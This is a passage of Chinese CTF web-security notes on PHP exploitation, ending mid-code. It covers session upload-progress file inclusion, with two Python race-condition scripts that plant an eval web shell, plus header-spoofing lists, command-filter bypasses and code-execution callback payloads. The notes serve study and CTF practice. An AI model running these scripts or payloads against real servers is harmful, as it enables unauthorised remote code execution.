<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 版本：php&gt;=5.4 </span></span><br><span class="line"><span class="comment"># 对应选项：session.upload_progress.enabled ，默认开启</span></span><br><span class="line"></span><br><span class="line">当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，</span><br><span class="line">上传进度可以在 <span class="variable">$_SESSION</span> 中获得。 </span><br><span class="line">当PHP检测到这种POST请求时，它会在 <span class="variable">$_SESSION</span> 中添加一组数据，</span><br><span class="line">索引是 session.upload_progress.prefix 与 session.upload_progress.name 连接在一起的值。</span><br></pre></td></tr></table></figure>

<h4 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h4><p>官方</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;upload.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line"> &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;&lt;?php echo ini_get(&quot;</span>session.upload_progress.name<span class="string">&quot;); ?&gt;&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file1&quot;</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file2&quot;</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>对应的数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;upload_progress_123&quot;</span>] = <span class="keyword">array</span>(    <span class="comment">// 其中存在上面表单里的value值&quot;123&quot;</span></span><br><span class="line"> <span class="string">&quot;start_time&quot;</span> =&gt; <span class="number">1234567890</span>,   <span class="comment">// The request time 请求时间</span></span><br><span class="line"> <span class="string">&quot;content_length&quot;</span> =&gt; <span class="number">57343257</span>, <span class="comment">// POST content length  post数据长度</span></span><br><span class="line"> <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">453489</span>,  <span class="comment">// Amount of bytes received and processed  已接收的字节数量</span></span><br><span class="line"> <span class="string">&quot;done&quot;</span> =&gt; <span class="literal">false</span>,              <span class="comment">// true when the POST handler has finished, successfully or not</span></span><br><span class="line"> <span class="string">&quot;files&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&quot;field_name&quot;</span> =&gt; <span class="string">&quot;file1&quot;</span>,       <span class="comment">// Name of the &lt;input/&gt; field  上传区域</span></span><br><span class="line">   <span class="comment">// The following 3 elements equals those in $_FILES</span></span><br><span class="line">   <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;foo.avi&quot;</span>,     <span class="comment">// 上传文件名</span></span><br><span class="line">   <span class="string">&quot;tmp_name&quot;</span> =&gt; <span class="string">&quot;/tmp/phpxxxxxx&quot;</span>,     <span class="comment">// 上传后在服务端的临时文件名</span></span><br><span class="line">   <span class="string">&quot;error&quot;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   <span class="string">&quot;done&quot;</span> =&gt; <span class="literal">true</span>,                <span class="comment">// True when the POST handler has finished handling this file</span></span><br><span class="line">   <span class="string">&quot;start_time&quot;</span> =&gt; <span class="number">1234567890</span>,    <span class="comment">// When this file has started to be processed</span></span><br><span class="line">   <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">57343250</span>, <span class="comment">// Amount of bytes received and processed for this file</span></span><br><span class="line">  ),</span><br><span class="line">  <span class="comment">// An other file, not finished uploading, in the same request</span></span><br><span class="line">  <span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&quot;field_name&quot;</span> =&gt; <span class="string">&quot;file2&quot;</span>,</span><br><span class="line">   <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;bar.avi&quot;</span>,</span><br><span class="line">   <span class="string">&quot;tmp_name&quot;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">   <span class="string">&quot;error&quot;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   <span class="string">&quot;done&quot;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">   <span class="string">&quot;start_time&quot;</span> =&gt; <span class="number">1234567899</span>,</span><br><span class="line">   <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">54554</span>,</span><br><span class="line">  ),</span><br><span class="line"> )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><h5 id="方法1：初始一个随机sessionid"><a href="#方法1：初始一个随机sessionid" class="headerlink" title="方法1：初始一个随机sessionid"></a>方法1：初始一个随机sessionid</h5><p>表单：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.43.82/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>表单对应的数据包：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在数据包HTTP头添加：</span><br><span class="line">    Cookie: PHPSESSID</span><br></pre></td></tr></table></figure>

<h5 id="方法2：GETShell"><a href="#方法2：GETShell" class="headerlink" title="方法2：GETShell"></a>方法2：GETShell</h5><p>某个session条件竞争的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            <span class="string">&#x27;http://192.168.43.82/index.php&#x27;</span>,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php phpinfo();fputs(fopen(&#x27;/var/www/html/shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[whoami])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;http://192.168.43.82/index.php?file=../../../../../../../../var/lib/php/sessions/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(&#x27;[+++]retry&#x27;)</span></span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure>

<p>另外一个利用脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://127.0.0.1:5555/test56.php&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">​</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>





<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="数据包伪造"><a href="#数据包伪造" class="headerlink" title="数据包伪造"></a>数据包伪造</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// XFF伪造来源地址</span></span><br><span class="line">X-Forwarded-For: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="comment">// 伪造来源URL</span></span><br><span class="line">Referer: www.baidu.com</span><br><span class="line"><span class="comment"># 2.重定向网站的访问浏览器</span></span><br><span class="line">User-Agent: Syclover</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造本地访问</span></span><br><span class="line">X-Forwarded-For:<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Forwarded:<span class="number">127.0</span>.<span class="number">0.1</span> </span><br><span class="line">Forwarded-For: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Forwarded: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Forwarded-Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-remote-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-remote-addr: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">True-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Real-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Ali-CDN-Real-IP:<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Cdn-Src-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Cdn-Real-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">CF-Connecting-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Cluster-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">WL-Proxy-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Proxy-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Fastly-Client-Ip :<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">True-Client-Ip :<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 伪造图片</span></span><br><span class="line"> GIF89a?</span><br><span class="line"></span><br><span class="line"><span class="comment">#遇到下面这种情况，并且被限制执行函数时，可以尝试下面的方法绕过</span></span><br><span class="line">`comment`   =&gt; c\at fla\g\.p\hp</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 前台js，使用谷歌浏览器</span></span><br><span class="line">   使用谷歌浏览器source进行调试，在console台修改js变量即可</span><br><span class="line">    如果太复杂只能再深入分析了</span><br></pre></td></tr></table></figure>


<h2 id="php可执行函数"><a href="#php可执行函数" class="headerlink" title="php可执行函数"></a>php可执行函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 无字符串查目录</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))); </span><br><span class="line"><span class="comment">// localeconv()获取一个符号数组</span></span><br><span class="line"><span class="comment">// pos()获取第一个元素</span></span><br><span class="line"><span class="comment">// scandir(): 这是一个 PHP 函数，用于扫描指定目录并返回目录中的文件和目录列表。它接受目录路径作为参数，并返回一个包含目录内容的数组。</span></span><br><span class="line"><span class="comment">// array_reverse(): 这是一个 PHP 函数，用于将数组中的元素顺序反转。</span></span><br><span class="line"><span class="comment">// show_source() 函数是 PHP 中的一个内置函数，它用于显示指定文件的源代码。该函数接受一个文件名作为参数，并将文件的内容以HTML格式输出到浏览器。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行、代码执行函数</span></span><br><span class="line"><span class="keyword">eval</span>():         <span class="comment">//将字符串作为php代码执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局变量函数</span></span><br><span class="line"><span class="variable">$GLOBALS</span>        <span class="comment">//查看超全局变量</span></span><br><span class="line"><span class="variable">$_GET</span>()         <span class="comment">//接受GET传参</span></span><br><span class="line"><span class="variable">$_POST</span>()        <span class="comment">//接受POST传参</span></span><br><span class="line"><span class="variable">$_SERVER</span>        <span class="comment">//全局性质的函数，暂不赘述</span></span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() <span class="comment">//返回由所有已定义变量所组成的数组</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 编码解码函数</span></span><br><span class="line"><span class="title function_ invoke__">urlencode</span>()     <span class="comment">//字符串编码为URL字符串</span></span><br><span class="line"><span class="title function_ invoke__">urldecode</span>()     <span class="comment">//解码URL编码的字符串</span></span><br><span class="line"><span class="title function_ invoke__">base64_encode</span>() <span class="comment">//字符串编码为base64字符串</span></span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>() <span class="comment">//base64字符串解码</span></span><br><span class="line"><span class="title function_ invoke__">bin2hex</span>() &amp; <span class="title function_ invoke__">hex2bin</span>() <span class="comment">//2进制转16进制/16进制转2进制</span></span><br><span class="line"><span class="title function_ invoke__">chr</span>()			<span class="comment">// 将数字转字符串</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 变量操作函数</span></span><br><span class="line"><span class="comment">## 单体操作函数</span></span><br><span class="line"><span class="title function_ invoke__">strstr</span>()        <span class="comment">//在一个字符串中查找指定的子字符串，并返回子字符串及其后面的内容。区分大小写</span></span><br><span class="line"><span class="title function_ invoke__">trim</span>()			<span class="comment">//去除两端空格和特殊字符 </span></span><br><span class="line"><span class="title function_ invoke__">substr</span>()        <span class="comment">//字符串截取，传入(字符串，截取位置，截取长度)，最后一个参数可以不加</span></span><br><span class="line"><span class="title function_ invoke__">strcmp</span>()		<span class="comment">//比较两个字符串的值，适当的返回1 0 -1三个值</span></span><br><span class="line">    <span class="comment">// 1：参数1&gt;参数2</span></span><br><span class="line">    <span class="comment">// 0：参数1=参数2	=&gt; 漏洞：比较数组的时候返回也是0（无法比较）</span></span><br><span class="line">    <span class="comment">// -1：参数1&lt;参数2</span></span><br><span class="line"><span class="title function_ invoke__">class_exists</span>()   <span class="comment">//将类自动加载并且实例化 --- 任意实例化漏洞</span></span><br><span class="line">    <span class="comment">//学习自：https://www.cnblogs.com/nice0e3/p/15383699.html  还有CTFSHO Wweb150_Plus</span></span><br><span class="line">    功能 ：检查类是否已定义</span><br><span class="line">	定义 ： <span class="keyword">bool</span> <span class="title function_ invoke__">class_exists</span> ( <span class="keyword">string</span> <span class="variable">$class_name</span>[, <span class="keyword">bool</span> <span class="variable">$autoload</span> = <span class="literal">true</span> ] )</span><br><span class="line">    <span class="comment"># 这一个函数和前面提到的新建对象一样，如果不存在这个类，同样也会调用__autoload魔术方法</span></span><br><span class="line">	<span class="variable">$class_name</span> 为类的名字，在匹配的时候不区分大小写。</span><br><span class="line">    	默认情况下 <span class="variable">$autoload</span> 为 <span class="literal">true</span>，当 <span class="variable">$autoload</span> 为 <span class="literal">true</span> 时，会自动加载本程序中的 __autoload 函数；</span><br><span class="line">    	当 <span class="variable">$autoload</span> 为 <span class="literal">false</span> 时，则不调用 __autoload 函数。</span><br><span class="line">    	<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    	class_exists() 函数来判断用户传过来的控制器是否存在，</span></span><br><span class="line"><span class="string">    	默认情况下，如果程序存在 __autoload 函数，那么在使用 class_exists() 函数就会自动调用本程序中的 __autoload 函数，</span></span><br><span class="line"><span class="string">    	这题的文件包含漏洞就出现在这个地方。攻击者可以使用 路径穿越 来包含任意文件，</span></span><br><span class="line"><span class="string">    	当然使用路径穿越符号的前提是 PHP5~5.3(包含5.3版本)版本 之间才可以。</span></span><br><span class="line"><span class="string">    	例如类名为： ../../../../etc/passwd 的查找，将查看passwd文件内容</span></span><br><span class="line"><span class="string">    	&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// class_exists(phpinfo);</span></span><br><span class="line">    <span class="comment">//当对方类存在 __construct，即存在文件包含</span></span><br><span class="line">`ls ../`</span><br><span class="line">    <span class="comment">// 代替了eval(system())直接执行Linux命令进行查询</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()</span><br><span class="line">    <span class="comment"># 某个统领型的参照：https://www.cnblogs.com/anweilx/p/12420107.html</span></span><br><span class="line">    <span class="comment"># 另外一个参照以及摘抄：https://blog.csdn.net/xiantianga6883/article/details/108378695</span></span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">	在实际项目中，不可能把所有的类都写在一个 PHP 文件中，</span></span><br><span class="line"><span class="string">	当在一个 PHP 文件中需要调用另一个文件中声明的类时，就需要通过 include 把这个文件引入。</span></span><br><span class="line"><span class="string">	不过有的时候，在文件众多的项目中，要一一将所需类的文件都 include 进来，</span></span><br><span class="line"><span class="string">	一个很大的烦恼是不得不在每个类文件开头写一个长长的包含文件的列表。</span></span><br><span class="line"><span class="string">	我们能不能在用到什么类的时候，再把这个类所在的 php 文件导入呢？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	为此，PHP 提供了 __autoload() 方法，它会在试图使用尚未被定义的类时自动调用。</span></span><br><span class="line"><span class="string">	通过调用此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。</span></span><br><span class="line"><span class="string">	__autoload() 方法接收的一个参数，就是欲加载的类的类名，</span></span><br><span class="line"><span class="string">	所以这时候需要类名与文件名对应，如 Person.php ，对应的类名就是 Pserson 。</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">## 多体操作函数</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>()		<span class="comment">// 将属于组: 键值对 =转换=&gt; 变量和值</span></span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>); <span class="comment">// 将get参数获得的变量和值组成的数组 转换为php程序的变量和值</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>( <span class="keyword">string</span> <span class="variable">$query_string</span> , <span class="keyword">array</span> &amp;<span class="variable">$result</span>) <span class="comment">//将URL查询字符串解析为数组</span></span><br><span class="line">	<span class="comment">#query_string(必需)表示需要解析成变量的查询字符串；</span></span><br><span class="line">	<span class="comment">#result(可选)是将查询字符串转换后的结果数组的引用。</span></span><br><span class="line"><span class="title function_ invoke__">explode</span>()       <span class="comment">//将指定分隔符拆分为数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 数组操作函数</span></span><br><span class="line"><span class="title function_ invoke__">sort</span>()			<span class="comment">//数组升序</span></span><br><span class="line"><span class="title function_ invoke__">rsort</span>()			<span class="comment">//数组降序</span></span><br><span class="line"><span class="title function_ invoke__">asort</span>()			<span class="comment">//升序并保留下标</span></span><br><span class="line"><span class="title function_ invoke__">arsort</span>()		<span class="comment">//降序并保留下标</span></span><br><span class="line"><span class="title function_ invoke__">ksort</span>()			<span class="comment">//下标升序</span></span><br><span class="line"><span class="title function_ invoke__">krsort</span>()		<span class="comment">//下标降序</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 文件操作函数</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()	<span class="comment">//获取文件内容</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>() <span class="comment">//输出文件内容</span></span><br><span class="line"><span class="title function_ invoke__">scandir</span>()       <span class="comment">//显示目录结构</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 输出函数</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>()		<span class="comment">//规则化显示变量的属性</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>()       <span class="comment">//输出数组信息</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 截断函数</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">exit</span>()</span><br><span class="line">    <span class="keyword">die</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 翻转函数</span></span><br><span class="line"><span class="title function_ invoke__">strrev</span>(<span class="string">&#x27;Hello world!&#x27;</span>)	<span class="comment">//左右反转字符串的函数</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 随机数控制</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>() 		<span class="comment">//指定随机数种子，当确定种子时随机数将完全确定，可以直接推</span></span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>()		<span class="comment">//生成随机数</span></span><br><span class="line">    <span class="comment">//利用随机数推演随机数种子的脚本：php_mt_seed</span></span><br></pre></td></tr></table></figure>

<h2 id="PHP传参-绕过"><a href="#PHP传参-绕过" class="headerlink" title="PHP传参+绕过"></a>PHP传参+绕过</h2><p>PHP绕过的大佬文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">点我</a></p>
<p>更多更详细绕过参照：<a target="_blank" rel="noopener" href="https://mochu.blog.csdn.net/article/details/104631142">点我</a></p>
<h2 id="传参涉及的php函数"><a href="#传参涉及的php函数" class="headerlink" title="传参涉及的php函数"></a>传参涉及的php函数</h2><h3 id="可执行函数"><a href="#可执行函数" class="headerlink" title="可执行函数"></a>可执行函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>()</span><br><span class="line">    <span class="comment"># 将字符串作为代码并且执行</span></span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">assert</span>()</span><br><span class="line">    <span class="comment"># 检测一个断言是否为false</span></span><br><span class="line">    PHP <span class="number">5</span></span><br><span class="line">    <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] ) : <span class="keyword">bool</span></span><br><span class="line">    PHP <span class="number">7</span></span><br><span class="line">    <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="title function_ invoke__">assert</span>()会检查指定的assertion并在结果为<span class="literal">false</span>时采取适当的行动。</span><br><span class="line">    在PHP5或PHP7中，如果assertion是字符串，它将会被<span class="title function_ invoke__">assert</span>()当做PHP代码来执行。</span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>()+/e</span><br><span class="line">    <span class="comment"># 执行一个正则表达式的搜索和替换</span></span><br><span class="line">	<span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] ) : <span class="keyword">mixed</span></span><br><span class="line">	搜索subject中匹配pattern的部分，以replacement进行替换。</span><br><span class="line">    如果pattern的模式修饰符使用/e，那么当subject被匹配成功时，replacement会被当做PHP代码执行</span><br><span class="line">    PS： <span class="title function_ invoke__">preg_replace</span>()+函数的/e修饰符在PHP7中被移除</span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">create_function</span>() </span><br><span class="line">    <span class="comment"># 创建一个匿名（lambda样式）函数</span></span><br><span class="line">    <span class="title function_ invoke__">create_function</span> ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">implode</span>()</span><br><span class="line">    <span class="comment"># 将数组转换为字符串</span></span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">parse_str</span>()</span><br><span class="line">    <span class="comment"># 将字符串转变量</span></span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">extract</span>()</span><br><span class="line">    <span class="comment"># 将数组转变量</span></span><br></pre></td></tr></table></figure>

<h3 id="可回调函数"><a href="#可回调函数" class="headerlink" title="可回调函数"></a>可回调函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>()</span><br><span class="line">    <span class="comment">#为数组的每个元素应用回调函数</span></span><br><span class="line">    <span class="title function_ invoke__">array_map</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$array</span> , <span class="keyword">array</span> ...<span class="variable">$arrays</span> ) : <span class="keyword">array</span></span><br><span class="line">	返回数组，是为<span class="keyword">array</span>每个元素应用callback函数之后的数组。 </span><br><span class="line">    <span class="title function_ invoke__">array_map</span>()返回一个<span class="keyword">array</span>，数组内容为array1的元素按索引顺序为参数调用callback后的结果</span><br><span class="line">    （有更多数组时，还会传入arrays的元素）。</span><br><span class="line">    callback函数形参的数量必须匹配<span class="title function_ invoke__">array_map</span>()实参中数组的数量。</span><br><span class="line">    ?c=assert&amp;arg[]=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>()</span><br><span class="line">	<span class="comment">#把第一个参数作为回调函数调用</span></span><br><span class="line">	<span class="title function_ invoke__">call_user_func</span> ( <span 